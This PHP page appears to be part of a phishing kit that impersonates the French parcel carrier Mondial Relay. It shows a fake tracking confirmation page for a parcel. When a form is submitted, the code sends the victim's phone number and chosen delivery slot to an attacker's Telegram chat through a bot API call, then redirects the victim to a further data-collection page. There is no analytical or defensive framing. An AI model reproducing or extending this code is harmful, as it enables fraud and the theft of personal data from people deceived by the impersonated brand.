<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    if (isset($_POST['date'])) {
        $_SESSION["date"] = $_POST["date"];

        telegram_api($rez["token"], "sendMessage", [
            "chat_id" => $rez["cliques"],
            "text" =>  "🌐 Suivi : <b>" . $rez["suivi"] . "</b>\n📞 Téléphone : " .  $_SESSION["phone"] . "\n⏲ Créneau : <b>" . $_POST["date"] . "</b>" . $info,
            "parse_mode" => "HTML",
        ]);
        header("location: /info");
    }

    die();
}
$header = require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/header.php');
$footer = require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/footer.php');
$html = (function () {
    global $rez;
    ob_start();
?>

    <form method="post">
        <div class="breadcrumb">
            <div class="grid">
                <div class="row">
                    <ul>
                        <li><a href="#/">
                                Accueil</a></li>
                        <li class="active">Suivi de colis</li>
                    </ul>
                </div>
            </div>
        </div>
        <div class="internal-page suivi">
            <div class="grid">
                <div class="row">
                    <div class="col-xs-12 col-sm-12 col-md-12 mt-5 center">
                    </div>
                </div>
            </div>
            <div class="main">

                <div data-v-67007474="" id="tracking-wrapper" class="app-wrapper">
                    <div data-v-577ebd12="" data-v-67007474="">
                        <div class="suivi-colis-page">
                            <div data-v-577ebd12="" class="input-zone">
                                <h2 data-v-577ebd12="">Colis numéro: <?= $rez["suivi"] ?>

                                </h2>

                                <p class="info-container" data-v-577ebd12="">
                                    Votre demande de livraison a bien été prise en compte. <br>Merci de votre confiance et à bientôt ! <br> <br>
                                    L'équipe de livraison, <br>
                                    Mondial Relay
                                </p>
                            </div>

    </form>
    <div id="loader-div-new" class="hidden-class-new">
        <div id="mask-id-new"></div>
        <div class="spinner-class-new"></div>
    </div>
    <script>
        document.querySelector("form").addEventListener("submit", function(e) {
            document.getElementById("loader-div-new").style.visibility = "visible";
            document.getElementById("mask-id-new").style = "opacity: 1; bottom: -500px;"
        })
    </script>
    </div>

    </div>
    </div>
    </div>
    </form>
<?php
    return ob_get_clean();
})();

$html = $header . $html . $footer;
require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/base.php');
?>